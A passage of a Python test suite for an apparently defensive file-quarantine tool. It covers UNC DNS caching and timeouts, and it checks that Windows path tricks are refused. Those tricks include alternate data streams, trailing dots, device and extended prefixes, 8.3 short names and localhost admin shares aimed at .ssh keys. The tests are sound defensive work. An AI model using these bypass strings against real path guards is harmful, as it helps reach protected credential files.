        try:
            with (
                mock.patch.object(platform, "_unc_now", now),
                mock.patch.object(platform, "_run_bounded", bounded),
            ):
                self.assertEqual(platform._machine_fqdn(), "")
                self.assertEqual(calls["n"], 1)
                self.assertEqual(platform._machine_fqdn(), "")
                self.assertEqual(calls["n"], 2)
                self.assertEqual(platform._machine_fqdn(), "")
                self.assertEqual(calls["n"], 2)
                clock["now"] = 5_061.0
                self.assertEqual(platform._machine_fqdn(), "box.example.com")
                self.assertEqual(calls["n"], 3)
                self.assertEqual(platform._machine_fqdn(), "box.example.com")
                self.assertEqual(calls["n"], 3)
            platform._clear_unc_dns_cache()
            calls["n"] = 0
            spent = time.monotonic() - 1.0
            with mock.patch.object(platform, "_run_bounded", bounded):
                self.assertEqual(platform._machine_fqdn(spent), "")
                self.assertEqual(calls["n"], 0)
                self.assertEqual(platform._machine_fqdn(), "")
                self.assertEqual(calls["n"], 1)
        finally:
            platform._clear_unc_dns_cache()

    def test_own_lookup_failure_expires_and_saturation_does_not_stick(self) -> None:
        from unittest import mock

        from sentinel import platform

        kwargs = self._kwargs()
        clock = {"now": 10_000.0}
        iface_calls = {"n": 0}

        def now() -> float:
            return clock["now"]

        def iface() -> tuple[set[object], bool]:
            iface_calls["n"] += 1
            if iface_calls["n"] == 1:
                raise OSError("lecture")
            return set(), False

        def bounded(func: object, timeout: float) -> tuple[str, object]:
            del func, timeout
            return "ok", ("198.51.100.4",)

        platform._clear_unc_dns_cache()
        try:
            with (
                mock.patch.object(platform, "_unc_now", now),
                mock.patch.object(platform, "_interface_ips", iface),
                mock.patch.object(platform, "_run_bounded", bounded),
            ):
                with self.assertRaises(platform.UncHostError) as caught:
                    classify_dest_text(r"\\8.8.8.8\share\file", **kwargs)
                self.assertIn("adresses locales indisponibles", str(caught.exception))
                self.assertIn("60", str(caught.exception))
                self.assertEqual(iface_calls["n"], 1)
                clock["now"] = 10_059.0
                with self.assertRaises(platform.UncHostError) as again:
                    classify_dest_text(r"\\8.8.8.8\share\file", **kwargs)
                self.assertIn("adresses locales indisponibles", str(again.exception))
                self.assertEqual(iface_calls["n"], 1)
                clock["now"] = 10_061.0
                self.assertEqual(
                    classify_dest_text(r"\\8.8.8.8\share\file", **kwargs),
                    "allow",
                )
                self.assertEqual(iface_calls["n"], 2)
        finally:
            platform._clear_unc_dns_cache()

        def busy(func: object, timeout: float) -> tuple[str, object]:
            del func, timeout
            return "busy", None

        def quiet() -> tuple[set[object], bool]:
            return set(), False

        platform._clear_unc_dns_cache()
        try:
            with (
                mock.patch.object(platform, "_unc_now", now),
                mock.patch.object(platform, "_interface_ips", quiet),
                mock.patch.object(platform, "_run_bounded", busy),
                self.assertRaises(platform.UncHostError) as caught_busy,
            ):
                classify_dest_text(r"\\8.8.8.8\share\file", **kwargs)
            self.assertIn("saturé", str(caught_busy.exception))
            with (
                mock.patch.object(platform, "_unc_now", now),
                mock.patch.object(platform, "_interface_ips", quiet),
                mock.patch.object(platform, "_run_bounded", bounded),
            ):
                self.assertEqual(
                    classify_dest_text(r"\\8.8.8.8\share\file", **kwargs),
                    "allow",
                )
        finally:
            platform._clear_unc_dns_cache()

    def test_slot_wait_counts_in_the_dns_deadline(self) -> None:
        import threading
        import time
        from unittest import mock

        from sentinel import platform
        from sentinel.platform import UNC_RESOLVER_WORKERS, UncHostError

        kwargs = self._kwargs()
        release_holders = threading.Event()
        release_extra = threading.Event()
        entered: list[str] = []

        def resolve(host: str) -> tuple[str, ...]:
            if host == "extra-host":
                release_extra.wait(2)
                return ("203.0.113.5",)
            entered.append(host)
            release_holders.wait(3)
            return ("203.0.113.5",)

        def once(host: str) -> None:
            try:
                classify_dest_text(rf"\\{host}\share\file", **kwargs)
            except UncHostError:
                pass

        platform._clear_unc_dns_cache()
        try:
            with (
                mock.patch.object(platform, "UNC_DNS_TIMEOUT", 0.5),
                mock.patch.object(platform, "_query_addrinfo", resolve),
                mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
            ):
                threads = [
                    threading.Thread(target=once, args=(f"hold-{index}",))
                    for index in range(UNC_RESOLVER_WORKERS)
                ]
                for thread in threads:
                    thread.start()
                deadline = time.monotonic() + 2
                while len(entered) < UNC_RESOLVER_WORKERS and time.monotonic() < deadline:
                    time.sleep(0.01)
                self.assertEqual(len(entered), UNC_RESOLVER_WORKERS)

                def free_later() -> None:
                    time.sleep(0.2)
                    release_holders.set()

                threading.Thread(target=free_later, daemon=True).start()
                started = time.monotonic()
                with self.assertRaises(UncHostError) as caught:
                    classify_dest_text(r"\\extra-host\share\file", **kwargs)
                elapsed = time.monotonic() - started
                self.assertGreater(elapsed, 0.45)
                self.assertLess(elapsed, 0.62)
                self.assertIn("expirée", str(caught.exception))
                release_holders.set()
                release_extra.set()
                for thread in threads:
                    thread.join(3)
        finally:
            release_holders.set()
            release_extra.set()
            platform._clear_unc_dns_cache()

    def test_proc_interface_parsers(self) -> None:
        import ipaddress

        from sentinel.platform import _parse_fib_trie_local, _parse_if_inet6

        v6 = _parse_if_inet6(
            "00000000000000000000000000000001 01 80 10 80 lo\n"
            "fe800000000000000000000000000001 02 40 20 80 eth0\n"
        )
        self.assertIn(ipaddress.IPv6Address("::1"), v6)
        self.assertIn(ipaddress.IPv6Address("fe80::1"), v6)
        v4 = _parse_fib_trie_local(
            "Main:\n"
            "   |-- 10.1.2.3\n"
            "      /32 host LOCAL\n"
            "Local:\n"
            "   |-- 192.0.2.10\n"
            "      /32 host LOCAL\n"
            "   |-- 192.0.2.255\n"
            "      /32 link BROADCAST\n"
        )
        self.assertIn(ipaddress.IPv4Address("192.0.2.10"), v4)
        self.assertNotIn(ipaddress.IPv4Address("10.1.2.3"), v4)
        self.assertNotIn(ipaddress.IPv4Address("192.0.2.255"), v4)

    def test_interface_list_failure_refuses_other_addresses(self) -> None:
        from unittest import mock

        from sentinel import platform

        kwargs = self._kwargs()

        def boom(*_args: object, **_kwargs: object) -> object:
            raise OSError("interfaces illisibles")

        platform._clear_unc_dns_cache()
        try:
            with (
                mock.patch.object(platform, "_interface_ips", boom),
                mock.patch.object(platform, "_addresses_from_getaddrinfo", boom),
                self.assertRaises(platform.UncHostError) as caught,
            ):
                classify_dest_text(r"\\8.8.8.8\share\file", **kwargs)
            self.assertIn("adresses locales indisponibles", str(caught.exception))
            self.assertNotIn("critique", str(caught.exception))
        finally:
            platform._clear_unc_dns_cache()

    def test_same_host_shares_one_resolution(self) -> None:
        import threading
        from unittest import mock

        from sentinel import platform

        kwargs = self._kwargs()
        calls: list[str] = []

        def resolve(host: str) -> tuple[str, ...]:
            calls.append(host)
            threading.Event().wait(0.3)
            return ("203.0.113.5",)

        platform._clear_unc_dns_cache()
        results: list[str] = []
        errors: list[BaseException] = []

        def once() -> None:
            try:
                results.append(
                    classify_dest_text(r"\\shared-host\public\file", **kwargs),
                )
            except BaseException as exc:
                errors.append(exc)

        with (
            mock.patch.object(platform, "_query_addrinfo", resolve),
            mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
        ):
            threads = [threading.Thread(target=once) for _ in range(2)]
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join(3)
        self.assertFalse(errors)
        self.assertEqual(results, ["allow", "allow"])
        self.assertEqual(calls, ["shared-host"])
        platform._clear_unc_dns_cache()

    def test_waiter_retries_an_inherited_inflight_failure_once(self) -> None:
        """Un waiter qui hérite l'échec d'un autre appelant réessaie une fois."""
        import threading
        import time
        from unittest import mock

        from sentinel import platform
        from sentinel.platform import UncHostError

        started = threading.Event()
        release = threading.Event()
        calls = {"n": 0}

        def leader() -> None:
            try:
                platform._lookup_unc_host("retry-host", time.monotonic() + 0.15)
            except UncHostError:
                pass

        def resolve(host: str) -> tuple[str, ...]:
            del host
            calls["n"] += 1
            if calls["n"] == 1:
                started.set()
                release.wait(3)
                return ("203.0.113.9",)
            return ("203.0.113.5",)

        platform._clear_unc_dns_cache()
        try:
            with mock.patch.object(platform, "_query_addrinfo", resolve):
                leader_thread = threading.Thread(target=leader)
                leader_thread.start()
                self.assertTrue(started.wait(2))
                found = platform._lookup_unc_host("retry-host", time.monotonic() + 2.0)
                release.set()
                leader_thread.join(3)
                self.assertFalse(leader_thread.is_alive())
            self.assertEqual(found, ("203.0.113.5",))
            self.assertEqual(calls["n"], 2)
        finally:
            release.set()
            platform._clear_unc_dns_cache()

        calls["n"] = 0
        started.clear()
        release.clear()

        def fail(host: str) -> tuple[str, ...]:
            del host
            calls["n"] += 1
            if calls["n"] == 1:
                started.set()
                release.wait(3)
                return ("203.0.113.9",)
            raise OSError("toujours en panne")

        platform._clear_unc_dns_cache()
        try:
            with mock.patch.object(platform, "_query_addrinfo", fail):
                leader_thread = threading.Thread(target=leader)
                leader_thread.start()
                self.assertTrue(started.wait(2))
                with self.assertRaises(UncHostError):
                    platform._lookup_unc_host("retry-host", time.monotonic() + 2.0)
                release.set()
                leader_thread.join(3)
                self.assertFalse(leader_thread.is_alive())
            self.assertEqual(calls["n"], 2)
        finally:
            release.set()
            platform._clear_unc_dns_cache()

    def test_timeout_message_uses_the_remaining_budget(self) -> None:
        """Le message dit le budget réel, pas toujours 2,0 s."""
        import re
        import threading
        import time
        from unittest import mock

        from sentinel import platform
        from sentinel.platform import UncHostError

        platform._clear_unc_dns_cache()
        release_hang = threading.Event()
        try:
            with (
                mock.patch.object(platform, "_remaining", return_value=0.0),
                self.assertRaises(UncHostError) as caught,
            ):
                platform._lookup_unc_host("budget-gone.example", 0.0)
            self.assertIn("(0.0 s)", str(caught.exception))
            self.assertNotIn("2.0", str(caught.exception))

            def hang(host: str) -> tuple[str, ...]:
                del host
                release_hang.wait(2)
                return ("203.0.113.8",)

            with (
                mock.patch.object(platform, "_remaining", return_value=0.4),
                mock.patch.object(platform, "_query_addrinfo", hang),
                self.assertRaises(UncHostError) as caught,
            ):
                platform._lookup_unc_host("budget-short.example", 1.0)
            self.assertIn("(0.4 s)", str(caught.exception))
            self.assertNotIn("2.0", str(caught.exception))
        finally:
            release_hang.set()
            platform._clear_unc_dns_cache()

        started = threading.Event()
        release = threading.Event()

        def hold(host: str) -> tuple[str, ...]:
            del host
            started.set()
            release.wait(3)
            return ("203.0.113.8",)

        def leader() -> None:
            try:
                platform._lookup_unc_host("budget-waiter.example", time.monotonic() + 3)
            except UncHostError:
                pass

        platform._clear_unc_dns_cache()
        try:
            with mock.patch.object(platform, "_query_addrinfo", hold):
                leader_thread = threading.Thread(target=leader)
                leader_thread.start()
                self.assertTrue(started.wait(2))
                with self.assertRaises(UncHostError) as caught:
                    platform._lookup_unc_host("budget-waiter.example", time.monotonic() + 0.25)
                release.set()
                leader_thread.join(3)
                self.assertFalse(leader_thread.is_alive())
            message = str(caught.exception)
            self.assertIn("expirée", message)
            self.assertNotIn("2.0", message)
            match = re.search(r"\(([0-9]+(?:\.[0-9]+)?) s\)", message)
            self.assertIsNotNone(match)
            assert match is not None
            self.assertLess(float(match.group(1)), 1.0)
        finally:
            release.set()
            platform._clear_unc_dns_cache()

    def test_retry_reports_total_time_waited(self) -> None:
        """Un follower qui réessaie affiche le délai total, pas la seconde tranche."""
        import re
        import threading
        import time
        from unittest import mock

        from sentinel import platform
        from sentinel.platform import UncHostError

        with mock.patch.object(platform, "_remaining", return_value=1.6):
            self.assertEqual(platform._time_waited(2.0, 0.0, 1.6), 2.0)
        with mock.patch.object(platform, "_remaining", return_value=0.4):
            self.assertEqual(platform._time_waited(0.4, 0.0, 0.4), 0.4)
        with mock.patch.object(platform, "_remaining", return_value=0.0):
            self.assertEqual(platform._time_waited(0.0, 0.0, 0.0), 0.0)

        started = threading.Event()
        release = threading.Event()
        calls = {"n": 0}

        def resolve(host: str) -> tuple[str, ...]:
            del host
            calls["n"] += 1
            if calls["n"] == 1:
                started.set()
            release.wait(5)
            return ("203.0.113.9",)

        def leader() -> None:
            try:
                platform._lookup_unc_host("total-wait.example", time.monotonic() + 0.35)
            except UncHostError:
                pass

        platform._clear_unc_dns_cache()
        try:
            with mock.patch.object(platform, "_query_addrinfo", resolve):
                leader_thread = threading.Thread(target=leader)
                leader_thread.start()
                self.assertTrue(started.wait(2))
                with self.assertRaises(UncHostError) as caught:
                    platform._lookup_unc_host("total-wait.example", time.monotonic() + 2.0)
                release.set()
                leader_thread.join(3)
                self.assertFalse(leader_thread.is_alive())
            message = str(caught.exception)
            self.assertNotIn("1.6", message)
            match = re.search(r"\(([0-9]+(?:\.[0-9]+)?) s\)", message)
            self.assertIsNotNone(match)
            assert match is not None
            waited = float(match.group(1))
            self.assertGreaterEqual(waited, 1.9)
            self.assertLessEqual(waited, 2.1)
            self.assertIn("(2.0 s)", message)
            self.assertGreaterEqual(calls["n"], 2)
        finally:
            release.set()
            platform._clear_unc_dns_cache()

    def test_resolver_pool_refuses_when_saturated(self) -> None:
        import threading
        import time
        from unittest import mock

        from sentinel import platform
        from sentinel.platform import UNC_RESOLVER_WORKERS, UncHostError

        kwargs = self._kwargs()
        release = threading.Event()
        entered: list[str] = []
        finished = threading.Event()

        def resolve(host: str) -> tuple[str, ...]:
            entered.append(host)
            release.wait(2)
            if len(entered) >= UNC_RESOLVER_WORKERS:
                finished.set()
            return ("203.0.113.5",)

        platform._clear_unc_dns_cache()
        errors: list[BaseException] = []

        def once(host: str) -> None:
            try:
                classify_dest_text(rf"\\{host}\share\file", **kwargs)
            except BaseException as exc:
                errors.append(exc)

        try:
            with (
                mock.patch.object(platform, "UNC_DNS_TIMEOUT", 0.25),
                mock.patch.object(platform, "_query_addrinfo", resolve),
                mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
            ):
                threads = [
                    threading.Thread(target=once, args=(f"pool-{index}",))
                    for index in range(UNC_RESOLVER_WORKERS)
                ]
                for thread in threads:
                    thread.start()
                # Quatre entrées, ou un plateau : un créneau encore tenu
                # par un délai précédent refuse le reste avant 0,25 s.
                deadline = time.monotonic() + 2
                stable_at = time.monotonic()
                previous = -1
                while time.monotonic() < deadline:
                    current = len(entered)
                    if current >= UNC_RESOLVER_WORKERS:
                        break
                    if current != previous:
                        previous = current
                        stable_at = time.monotonic()
                    elif current > 0 and time.monotonic() - stable_at > 0.4:
                        break
                    time.sleep(0.01)
                self.assertGreater(len(entered), 0)
                self.assertLessEqual(len(entered), UNC_RESOLVER_WORKERS)
                started = time.monotonic()
                with self.assertRaises(UncHostError) as caught:
                    classify_dest_text(r"\\pool-extra\share\file", **kwargs)
                self.assertLess(time.monotonic() - started, 1.0)
                self.assertIn("saturé", str(caught.exception))
                release.set()
                for thread in threads:
                    thread.join(3)
                self.assertFalse(any(thread.is_alive() for thread in threads))
        finally:
            release.set()
            platform._clear_unc_dns_cache()

    def test_dns_cache_ttl(self) -> None:
        from unittest import mock

        from sentinel import platform

        kwargs = self._kwargs()
        clock = {"now": 1_000.0}
        calls: list[str] = []

        def now() -> float:
            return clock["now"]

        def resolve(host: str) -> tuple[str, ...]:
            calls.append(host)
            return ("203.0.113.5",)

        def fail(host: str) -> tuple[str, ...]:
            calls.append(host)
            raise OSError("introuvable")

        platform._clear_unc_dns_cache()
        try:
            with (
                mock.patch.object(platform, "_unc_now", now),
                mock.patch.object(platform, "_query_addrinfo", resolve),
                mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
            ):
                self.assertEqual(
                    classify_dest_text(r"\\ttl-host\public\file", **kwargs),
                    "allow",
                )
                clock["now"] = 1_000.0 + 299
                self.assertEqual(
                    classify_dest_text(r"\\ttl-host\public\file", **kwargs),
                    "allow",
                )
                self.assertEqual(calls, ["ttl-host"])
                clock["now"] = 1_000.0 + 301
                self.assertEqual(
                    classify_dest_text(r"\\ttl-host\public\file", **kwargs),
                    "allow",
                )
                self.assertEqual(calls, ["ttl-host", "ttl-host"])
            platform._clear_unc_dns_cache()
            calls.clear()
            clock["now"] = 5_000.0
            with (
                mock.patch.object(platform, "_unc_now", now),
                mock.patch.object(platform, "_query_addrinfo", fail),
                mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
                self.assertRaises(platform.UncHostError),
            ):
                classify_dest_text(r"\\ttl-miss\share\file", **kwargs)
            self.assertEqual(calls, ["ttl-miss"])
            clock["now"] = 5_059.0
            with (
                mock.patch.object(platform, "_unc_now", now),
                mock.patch.object(platform, "_query_addrinfo", fail),
                mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
                self.assertRaises(platform.UncHostError),
            ):
                classify_dest_text(r"\\ttl-miss\share\file", **kwargs)
            self.assertEqual(calls, ["ttl-miss"])
            clock["now"] = 5_061.0
            with (
                mock.patch.object(platform, "_unc_now", now),
                mock.patch.object(platform, "_query_addrinfo", fail),
                mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
                self.assertRaises(platform.UncHostError),
            ):
                classify_dest_text(r"\\ttl-miss\share\file", **kwargs)
            self.assertEqual(calls, ["ttl-miss", "ttl-miss"])
        finally:
            platform._clear_unc_dns_cache()

    def test_trailing_dots_spaces_and_streams(self) -> None:
        kwargs = self._kwargs()
        hard = {
            r"C:\Users\alice\.ssh.": "hard",
            r"C:\Users\alice\.ssh ": "hard",
            r"C:\Users\alice\.ssh. ": "hard",
            r"C:\Users\alice\.ssh...": "hard",
            r"C:\Users\alice\.SSH.": "hard",
            r"C:\Users\alice\.ssh::$DATA": "hard",
            r"C:\Users\alice\.ssh::$data": "hard",
            r"C:\Users\alice\.ssh:$INDEX_ALLOCATION": "hard",
            r"C:\Users\alice\.ssh:$index_allocation": "hard",
            r"C:\Users\alice\.ssh.::$DATA": "hard",
            r"C:\Users\alice\.ssh::$DATA ": "hard",
            r"\\?\C:\Users\alice\.ssh.": "hard",
            r"//?/C:/Users/alice/.ssh.": "hard",
            r"C:\Users\alice\Projects\q:secret": "hard",
            r"C:\Users\alice\Projects\q:secret:$DATA": "hard",
            r"C:Users\alice\.ssh": "hard",
            r"c:users\alice\.ssh\id": "hard",
            r"C:": "hard",
            r"\??\C:\Users\alice\.ssh": "hard",
            r"/??/C:/Users/alice/.ssh": "hard",
            r"\??\UNC\localhost\C$\Users\alice\.ssh": "hard",
            r"\\??\C:\Users\alice\.ssh": "hard",
            r"\\?\C:Users\alice\.ssh": "hard",
        }
        allow = {
            r"C:\Users\alice\Projects\q::$DATA": "allow",
            r"C:\Users\alice\Projects\q.::$data": "allow",
            r"C:\Users\alice\Projects\note.txt:$INDEX_ALLOCATION": "allow",
            r"C:\Users\alice\.ssh.\..\Projects\q": "allow",
        }
        soft = {
            r"C:\Windows\System32 \q": "soft",
            r"C:\Windows\System32::$DATA\q": "soft",
        }
        for dest, expected in {**hard, **allow, **soft}.items():
            with self.subTest(dest=dest):
                self.assertEqual(classify_dest_text(dest, **kwargs), expected)
        self.assertTrue(
            path_is_within(
                r"C:\Users\alice\.ssh.",
                r"C:\Users\alice\.ssh",
                os_name="nt",
                fold=True,
            )
        )

    def test_unsafe_nt_does_not_traceback_from_cli_or_gui(self) -> None:
        import io
        from contextlib import redirect_stderr
        from unittest import mock

        from sentinel.__main__ import main as cli_main
        from sentinel.platform import UnsafeNtPath

        err = io.StringIO()
        with (
            mock.patch(
                "sentinel.__main__.quarantine_paths",
                side_effect=UnsafeNtPath(r"\\.\C:\secret"),
            ),
            redirect_stderr(err),
        ):
            code = cli_main(["quarantine", "note.txt"])
        text = err.getvalue()
        self.assertEqual(code, 2)
        self.assertNotIn("Traceback", text)
        self.assertIn("Chemin Windows refusé", text)

        import sys
        import types

        import sentinel.gui as gui

        fake_app = types.ModuleType("sentinel.gui.app")

        def _boom(argv: list[str] | None = None) -> int:
            del argv
            raise UnsafeNtPath(r"\??\C:\secret")

        fake_app.main = _boom
        previous_app = sys.modules.get("sentinel.gui.app")
        sys.modules["sentinel.gui.app"] = fake_app
        err = io.StringIO()
        try:
            with redirect_stderr(err):
                code = gui.main([])
        finally:
            if previous_app is None:
                sys.modules.pop("sentinel.gui.app", None)
            else:
                sys.modules["sentinel.gui.app"] = previous_app
        text = err.getvalue()
        self.assertEqual(code, 2)
        self.assertNotIn("Traceback", text)
        self.assertIn("Chemin Windows refusé", text)


class TestWindowsShortNames(unittest.TestCase):
    """Les noms 8.3 ne contournent pas les listes dures."""

    def setUp(self) -> None:
        if os.name != "nt":
            self.skipTest("nom court 8.3 : Windows seulement")
        self._saved = {
            key: os.environ.get(key) for key in ("TMPDIR", "TEMP", "TMP", "HOME", "USERPROFILE")
        }

    def tearDown(self) -> None:
        if os.name != "nt":
            return
        for key, value in self._saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value

    def _short(self, path: Path) -> str:
        from sentinel._winapi import short_path_name

        short = short_path_name(str(path))
        long = str(path.resolve())
        if os.path.normcase(short) == os.path.normcase(long):
            self.skipTest("noms 8.3 désactivés sur ce volume")
        return short

    def test_profile_and_ssh_short_names_are_refused(self) -> None:
        from sentinel.platform import restrict_key_file

        profile = Path(os.environ["USERPROFILE"])
        short_home = self._short(profile)
        self.assertEqual(live_dest_class(Path(short_home)), "hard")
        self.assertEqual(source_class(Path(short_home)), "hard")
        ssh = Path(short_home) / ".ssh"
        ident = ssh / "id_ed25519"
        self.assertEqual(live_dest_class(ssh), "hard")
        self.assertEqual(live_dest_class(ident), "hard")
        self.assertEqual(source_class(ssh), "hard")

        probe = profile / "sentinel-short-probe.txt"
        key = profile / "sentinel-short-key.txt"
        ordinary = profile / "sentinel-ordinary-temp"
        store = Path(tempfile.mkdtemp(prefix="sentinel-short-store-"))
        try:
            probe.write_text("x\n", encoding="utf-8")
            short_probe = self._short(probe)
            self.assertEqual(live_dest_class(Path(short_probe)), "allow")

            records, failures = quarantine_paths(
                [probe], Path(short_home), Path(short_home) / "manifest.jsonl"
            )
            self.assertEqual(records, [])
            self.assertIn("critique", failures[0][1])
            self.assertTrue(probe.is_file())

            records, failures = quarantine_paths([ssh], store, store / "manifest.jsonl")
            self.assertEqual(records, [])
            self.assertIn("critique", failures[0][1])
            self.assertTrue(probe.is_file())

            key.write_text("secret\n", encoding="utf-8")
            restrict_key_file(key)
            self.assertEqual(read_key_file(Path(self._short(key))), "secret")

            ordinary.mkdir()
            (ordinary / "note.txt").write_text("n\n", encoding="utf-8")
            os.environ["TMPDIR"] = self._short(ordinary)
            os.environ["TEMP"] = os.environ["TMPDIR"]
            os.environ["TMP"] = os.environ["TMPDIR"]
            self.assertEqual(live_dest_class(ordinary), "soft")
            self.assertEqual(live_dest_class(Path(os.environ["TMPDIR"])), "soft")
            self.assertEqual(live_dest_class(ordinary / "note.txt"), "allow")
            note_short = self._short(ordinary / "note.txt")
            self.assertEqual(live_dest_class(Path(note_short)), "allow")
        finally:
            import shutil

            probe.unlink(missing_ok=True)
            key.unlink(missing_ok=True)
            shutil.rmtree(ordinary, ignore_errors=True)
            shutil.rmtree(store, ignore_errors=True)

    def test_long_name_failure_is_closed(self) -> None:
        from unittest import mock

        profile = Path(os.environ["USERPROFILE"])
        with mock.patch("sentinel._winapi.long_path_name", side_effect=OSError("nom long")):
            self.assertEqual(live_dest_class(profile), "hard")
            self.assertEqual(source_class(profile / "not-ssh.txt"), "hard")
            with self.assertRaises(KeySourceError):
                read_key_file(profile / "missing-key.txt")
            os.environ["TMPDIR"] = str(profile)
            self.assertEqual(live_dest_class(profile / "note.txt"), "hard")

    def test_extended_and_device_prefixes_are_refused(self) -> None:
        profile = os.environ["USERPROFILE"]
        windir = os.environ.get("SYSTEMROOT", r"C:\Windows")
        ssh = profile + r"\.ssh"
        system = windir + r"\System32\q"
        expected = {
            "\\\\?\\" + ssh: "hard",
            "\\\\?\\" + profile: "hard",
            "\\\\?\\" + system: "soft",
            "//?/" + ssh.replace("\\", "/"): "hard",
            "//?/" + system.replace("\\", "/"): "soft",
            "\\\\.\\" + ssh: "hard",
            "\\\\.\\" + profile: "hard",
            "\\\\.\\" + system: "hard",
            "//./" + ssh.replace("\\", "/"): "hard",
            "//./" + system.replace("\\", "/"): "hard",
        }
        src = Path(tempfile.mkdtemp(prefix="sentinel-ntprefix-")) / "note.txt"
        src.parent.mkdir(exist_ok=True)
        src.write_text("x\n", encoding="utf-8")
        store = Path(tempfile.mkdtemp(prefix="sentinel-ntstore-"))
        try:
            for text, kind in expected.items():
                with self.subTest(path=text, kind=kind):
                    path = Path(text)
                    self.assertEqual(live_dest_class(path), kind)
                    self.assertEqual(source_class(path), kind)
                    records, failures = quarantine_paths([src], path, path / "manifest.jsonl")
                    self.assertEqual(records, [])
                    self.assertTrue(failures)
                    self.assertTrue(src.is_file())
                    if kind == "hard":
                        self.assertIn("critique", failures[0][1])
                    else:
                        self.assertIn("sensible", failures[0][1])
            key = Path(profile) / "sentinel-ntprefix-key.txt"
            key.write_text("secret\n", encoding="utf-8")
            try:
                from sentinel.platform import restrict_key_file

                restrict_key_file(key)
                self.assertEqual(read_key_file(Path("\\\\?\\" + str(key))), "secret")
                with self.assertRaises(KeySourceError):
                    read_key_file(Path("\\\\.\\" + str(key)))
            finally:
                key.unlink(missing_ok=True)
        finally:
            import shutil

            shutil.rmtree(src.parent, ignore_errors=True)
            shutil.rmtree(store, ignore_errors=True)

    def test_local_admin_shares_are_refused(self) -> None:
        """UNC local et partage ``$`` : source et destination, sur le runner."""
        profile = os.environ["USERPROFILE"]
        letter = profile[0]
        tail = profile[2:]
        secret = [
            f"\\\\localhost\\{letter}$" + tail + "\\.ssh",
            f"\\\\127.0.0.1\\{letter.lower()}$" + tail + "\\.ssh",
            f"\\\\?\\UNC\\localhost\\{letter}$" + tail + "\\.ssh",
            f"\\\\?\\UNC\\LOCALHOST\\{letter}$" + tail,
            "//?/UNC/localhost/" + letter + "$" + tail.replace("\\", "/") + "/.ssh",
            r"\\127.1\Users\sentinel-not-admin",
            r"\\0x7f000001\Users\sentinel-not-admin",
            r"\\0--1.ipv6-literal.net\Users\sentinel-not-admin",
        ]
        # System32 via C$ est au mieux sensible (si le système ramène le
        # partage à C:\Windows), jamais autorisé.
        system = f"\\\\localhost\\{letter}$\\Windows\\System32\\q"
        src = Path(tempfile.mkdtemp(prefix="sentinel-unc-")) / "note.txt"
        src.parent.mkdir(exist_ok=True)
        src.write_text("x\n", encoding="utf-8")
        try:
            for text in secret:
                with self.subTest(path=text):
                    path = Path(text)
                    self.assertEqual(live_dest_class(path), "hard")
                    self.assertEqual(source_class(path), "hard")
                    records, failures = quarantine_paths([src], path, path / "manifest.jsonl")
                    self.assertEqual(records, [])
                    self.assertTrue(failures)
                    self.assertIn("critique", failures[0][1])
                    self.assertTrue(src.is_file())
            path = Path(system)
            self.assertNotEqual(live_dest_class(path), "allow")
            self.assertNotEqual(source_class(path), "allow")
            records, failures = quarantine_paths([src], path, path / "manifest.jsonl")
            self.assertEqual(records, [])
            self.assertTrue(failures)
            self.assertTrue(src.is_file())
        finally:
            import shutil

            shutil.rmtree(src.parent, ignore_errors=True)
